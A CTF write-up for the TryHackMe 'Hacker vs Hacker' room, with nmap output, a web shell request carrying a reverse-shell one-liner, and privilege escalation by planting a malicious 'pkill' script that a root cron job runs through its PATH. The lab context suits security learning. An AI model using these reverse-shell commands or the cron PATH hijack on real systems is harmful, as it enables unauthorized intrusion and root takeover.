## Haker vs hacker
https://tryhackme.com/room/hackervshacker

## Enum
```
nmap -Pn -sC -sV -A 10.10.7.83 -vv
```
```
Scanning ip.thm (10.10.7.83) [1000 ports]

Discovered open port 80/tcp on 10.10.7.83
Discovered open port 22/tcp on 10.10.7.83

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 9f:a6:01:53:92:3a:1d:ba:d7:18:18:5c:0d:8e:92:2c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEwViZRbXUs9kag3j00D1FtRrtg3PKTSXGdTaJC14E+FWVLUKxlCTbI89GtFCqL22nDVi3nmG5QQDxEfl4zTOIgZXi4FXst0ZfzMayH8T+t9jSc2OlCuIyZYyw+JDP2G+WJXHC67BSthXTt9eMeDPxi7r03GA0nqMSFJ8lw5FqTnzyacLne5ojiB/atnHpVXa0DoSmT+w8t1Pk3nhnk0zrlOxVOfkx8Jze8NHynP4BFr/Ea3PNvvmJ2hpRUgO3IGVQ3bt55ab3ZoFy344Fy5ISsYXYQJBeLUhu2GVeCihzgUFkecKZEUhnc0S8Idy5EnDWeEaRQjE832gKvUJ9d0PIEN8sTxgSEp1RcijMm8/2vEWzeRVAKaHCaU8lV/jbtyl6s5jgkStuy6NwqpWf24D0TydU5jwsjGTLWJbrDNsYbP28qas0o2+zwmzqwaOJMwuk0CYVZCcd2qGVRRxYu6NhfIudRPMLPp/EvhfEUPoYR6tmX42pvpqNH70kotCiQiM=
|   256 4b:60:dc:fb:92:a8:6f:fc:74:53:64:c1:8c:bd:de:7c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMZXOzdGFYNrQPBrILKG3Zd+DlWWE133ONnKOGm3MhuTgWZjEkYI1g5pn6ggVCnJwZHgvkvjSudcCImNk92yW7g=
|   256 83:d4:9c:d0:90:36:ce:83:f7:c7:53:30:28:df:c3:d5 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEznWyrDbdSTIAxhoKlcRP8mZ/LX/wQSAvofU1MLracp
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.41 ((Ubuntu))
|_http-title: RecruitSec: Industry Leading Infosec Recruitment
| http-methods:
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-favicon: Unknown favicon MD5: DD1493059959BA895A46C026C39C36EF
|_http-server-header: Apache/2.4.41 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=8/30%OT=22%CT=1%CU=40796%PV=Y%DS=4%DC=T%G=Y%TM=630DE4A
OS:2%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M505ST11NW6%O2=M505ST11NW6%O3=M505NNT11NW6%O4=M505ST11NW6%O5=M505ST1
OS:1NW6%O6=M505ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN
OS:(R=Y%DF=Y%T=40%W=F507%O=M505NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 166.05 seconds
           Raw packets sent: 1363 (64.022KB) | Rcvd: 1111 (47.930KB)
```

![image](https://user-images.githubusercontent.com/6504854/187413933-ffd31835-eea0-4698-8e5d-83c177b68eb1.png)

![image](https://user-images.githubusercontent.com/6504854/187414133-03638604-3962-4204-a583-368956e7bbf9.png)

![image](https://user-images.githubusercontent.com/6504854/187414210-83842cd0-1e01-4056-ba91-92d9c4f89d1e.png)

![image](https://user-images.githubusercontent.com/6504854/187414519-d01de40e-3257-47c9-bf28-3f008a30a916.png)

![image](https://user-images.githubusercontent.com/6504854/187414683-157e040c-fc0c-4786-87c9-6f1a494960e3.png)

![image](https://user-images.githubusercontent.com/6504854/187414815-5c4b0141-66d4-4c23-b106-222766d2fd9a.png)

🏴 I couldn't find this page, I stcked and checked writeups. 

Mmmm, if I read souce code cafully and I could have guessed the file name, extention... 

![image](https://user-images.githubusercontent.com/6504854/187415719-673040a6-e922-49ea-ba51-2150c1945b00.png)

![image](https://user-images.githubusercontent.com/6504854/187417103-99862d30-a68b-4d09-9b8b-bf9f0c76167c.png)

Request
```
GET /cvs/shell.pdf.php?cmd=bash+-c+'sh+-i+>%26+/dev/tcp/10.10.10.10/4444+0>%261' HTTP/1.1
Host: ip.thm


```
🏴 OK!

## Flag
```
$cd /home/lachlan
$cat /home/lachlan/user.txt
$ cat .bash_history
./cve.sh
./cve-patch.sh
vi /etc/cron.d/persistence
echo -e "d**************\n*************\n*************" | passwd
ls -sf /dev/null /home/lachlan/.bash_history

$ su lachlan
Password: 
id
uid=1001(lachlan) gid=1001(lachlan) groups=1001(lachlan)

cd bin

ls -la
total 12
drwxr-xr-x 2 lachlan lachlan 4096 May  5 04:38 .
drwxr-xr-x 4 lachlan lachlan 4096 May  5 04:39 ..
-rw-r--r-- 1 lachlan lachlan   56 May  5 04:38 backup.sh

cat backup.sh
# todo: pita website backup as requested by her majesty
```

```
python3 -c "import pty;pty.spawn('/bin/bash')"
lachlan@b2r:~/bin$ nope
python3 -c "import pty;pty.spawn('/bin/bash')"
lachlan@b2r:~/bin$ nope
python3 -c "import pty;pty.spawn('/bin/bash')"
lachlan@b2r:~/bin$ sudo -nope
```
🏴 Who prints 'nope', cron or at ?

```
cd /etc/cron.d

ls -la

total 28
drwxr-xr-x   2 root root 4096 May  5 04:38 .
drwxr-xr-x 102 root root 4096 May  5 04:55 ..
-rw-r--r--   1 root root  201 Feb 14  2020 e2scrub_all
-rw-r--r--   1 root root  814 May  5 04:38 persistence
-rw-r--r--   1 root root  712 Mar 27  2020 php
-rw-r--r--   1 root root  102 Feb 13  2020 .placeholder
-rw-r--r--   1 root root  191 Feb 23  2022 popularity-contest

find ./ -type f | xargs grep nope

./persistence:* * * * * root /bin/sleep 1  && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done

cat persistence

PATH=/home/lachlan/bin:/bin:/usr/bin
# * * * * * root backup.sh
* * * * * root /bin/sleep 1  && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 11 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 21 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 31 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 41 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 51 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
```
🏴 Backup.sh is commented out 😢

```
cd /home/lachlan/bin

export PATH=/home/lachlan/bin:$PATH
echo $PATH
/home/lachlan/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

echo "bash -c 'sh -i >& /dev/tcp/10.10.10.10/4242 0>&1'" > pkill
chmod +x pkill
```

```
nc -lnvp 4242
listening on [any] 4242 ...
connect to [10.10.10.10] from (UNKNOWN) [10.10.7.83] 58460
sh: 0: can't access tty; job control turned off
# cat root.txt
```

Thank you for your time. Happy Hacking. 😋

## Omake
```
nmap -Pn 10.10.7.83 -p- --open --min-rate 1000

Nmap scan report for ip.thm (10.10.7.83)
Host is up (0.43s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 68.50 seconds
```
shell.pdf.phpでてこなくて、他のポートか？とおもったのだが。。

![image](https://user-images.githubusercontent.com/6504854/187426617-476e0c3c-963c-4816-bdde-3d82ce1f2a20.png)

これ思い出した。FCのSpyvsSpy、なつい～。 😎


